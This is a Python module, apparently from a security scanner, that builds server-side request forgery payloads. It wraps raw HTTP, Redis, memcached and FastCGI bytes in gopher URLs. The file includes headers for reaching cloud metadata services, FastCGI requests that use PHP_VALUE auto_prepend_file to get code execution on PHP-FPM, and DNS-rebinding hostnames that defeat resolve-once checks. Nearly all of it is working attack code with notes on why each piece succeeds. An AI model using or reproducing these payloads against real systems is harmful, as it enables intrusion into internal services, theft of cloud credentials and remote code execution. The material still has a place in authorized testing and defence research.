"""Protocol payload construction: the bytes, before any transport encoding.

An SSRF that can speak gopher can speak anything the far side accepts, so the
interesting part is not the URL but what goes inside it. These are pure
functions - bytes in, a gopher URL out - so each one can be reproduced and
tested on its own.

The encoding rule is the one worth stating once: everything after the `_` in a
gopher URL is percent-decoded by the client before it is written to the socket,
and the URL itself is percent-encoded again on the way out as a parameter. That
is why a request built here encodes every byte, including the CRLFs: they have
to survive a web server's decode and still be decoded by the protocol client.
"""

from __future__ import annotations

import struct
from urllib.parse import quote

# FastCGI record types.
FCGI_BEGIN_REQUEST = 1
FCGI_PARAMS = 4
FCGI_STDIN = 5
FCGI_RESPONDER = 1


# --------------------------------------------------------------------- gopher


def gopher_raw(host: str, port: int, data: bytes) -> str:
    """A gopher URL that writes exactly these bytes to the socket."""
    return f"gopher://{host}:{port}/_" + quote(data, safe="")


def gopher_http(
    host: str,
    port: int,
    path: str = "/",
    method: str = "GET",
    headers: tuple[tuple[str, str], ...] = (),
    body: bytes = b"",
) -> str:
    """An HTTP request carried over gopher.

    This is how a header gets somewhere a URL cannot reach: the metadata
    services that demand one - `Metadata-Flavor: Google`, `Metadata: true` -
    are otherwise unreachable through a plain URL parameter.
    """
    lines = [f"{method} {path} HTTP/1.1", f"Host: {host}"]
    for name, value in headers:
        lines.append(f"{name}: {value}")
    if body:
        lines.append(f"Content-Length: {len(body)}")
    lines.append("Connection: close")
    raw = ("\r\n".join(lines) + "\r\n\r\n").encode("latin-1") + body
    return gopher_raw(host, port, raw)


def redis_command(host: str, port: int, *commands: str) -> str:
    """Inline Redis commands, one per line.

    Inline form rather than the RESP array: fewer bytes to encode, and a Redis
    server reads it identically.
    """
    payload = "".join(f"{command}\r\n" for command in commands)
    return gopher_raw(host, port, payload.encode("utf-8"))


def memcached_command(host: str, port: int, *commands: str) -> str:
    payload = "".join(f"{command}\r\n" for command in commands)
    return gopher_raw(host, port, payload.encode("utf-8"))


# ------------------------------------------------------------------- fastcgi


def _fcgi_length(size: int) -> bytes:
    if size < 128:
        return bytes([size])
    return struct.pack(">I", size | 0x80000000)


def _fcgi_record(record_type: int, content: bytes, request_id: int = 1) -> bytes:
    """One FastCGI record, padded so the header and content align to 8 bytes.

    The padding is not optional decoration: the reference client pads, the
    listener expects it, and a stream that skips it is treated as malformed -
    which is how a request that looks structurally perfect gets its connection
    reset without a word.
    """
    padding = (8 - (len(content) % 8)) % 8
    header = struct.pack(
        ">BBHHBB",
        1,                # version
        record_type,
        request_id,
        len(content),
        padding,
        0,                # reserved
    )
    return header + content + bytes(padding)


def fcgi_params(params: dict[str, str]) -> bytes:
    """Encode name-value pairs the way FastCGI actually lays them out.

    Each pair is `nameLength, valueLength, name, value` - both lengths first,
    then the two strings. Writing it as `nameLength, name, valueLength, value`
    looks more natural and produces a stream that is almost right: the listener
    reads the first length, takes the second length as the start of the name,
    and drops the connection without saying why. That is what this cost to find.
    """
    out = bytearray()
    for name, value in params.items():
        raw_name = name.encode("utf-8")
        raw_value = value.encode("utf-8")
        out += _fcgi_length(len(raw_name)) + _fcgi_length(len(raw_value))
        out += raw_name + raw_value
    return bytes(out)


def fcgi_request(host: str, port: int, params: dict[str, str], stdin: bytes = b"") -> str:
    """A FastCGI request, which is what a PHP-FPM socket on a port expects.

    The parameters are where the code goes: `PHP_VALUE` can set
    `auto_prepend_file` to a stream the request body controls, which turns a
    socket that only speaks FastCGI into execution.
    """
    body = struct.pack(">HBxxxxx", FCGI_RESPONDER, 0)
    data = _fcgi_record(FCGI_BEGIN_REQUEST, body)
    data += _fcgi_record(FCGI_PARAMS, fcgi_params(params))
    data += _fcgi_record(FCGI_PARAMS, b"")
    if stdin:
        data += _fcgi_record(FCGI_STDIN, stdin)
    data += _fcgi_record(FCGI_STDIN, b"")
    return gopher_raw(host, port, data)


# ------------------------------------------------------------------ plumbing


def crlf_encode(value: str) -> str:
    """Percent-encode the bytes a protocol needs literally."""
    return quote(value, safe="")


# ------------------------------------------------------------------ rebinding


def _hex_ip(address: str) -> str:
    return "".join(f"{int(part):02x}" for part in address.split("."))


def rebind_host(internal: str, external: str, domain: str = "rbndr.us") -> str:
    """A name that alternates between two addresses.

    What a DNS rebinding defeats is a check performed once: the application
    resolves the name, decides the address is fine, and then resolves it again
    when it actually connects. Between those two lookups the answer has to
    change - so a name that alternates inside one TTL is the whole primitive.

    `rbndr.us` is a public service that does exactly this; the alternative is
    running your own resolver on port 53 with authority over a domain, which is
    more moving parts than a scanner should require of its user.
    """
    return f"{_hex_ip(internal)}.{_hex_ip(external)}.{domain}"


def with_host(payload: str, host: str) -> str:
    """Rewrite a URL's host, keeping its scheme, port and path."""
    import re

    pattern = re.compile(r"^([a-zA-Z][a-zA-Z0-9+.\-]*://)([^/?#]*)(.*)$", re.S)
    match = pattern.match(payload)
    if not match:
        return payload
    scheme, authority, rest = match.groups()
    userinfo, at, hostport = authority.rpartition("@")
    prefix = f"{userinfo}@" if at else ""
    _, colon, port = hostport.partition(":")
    return f"{scheme}{prefix}{host}{colon}{port}{rest}"
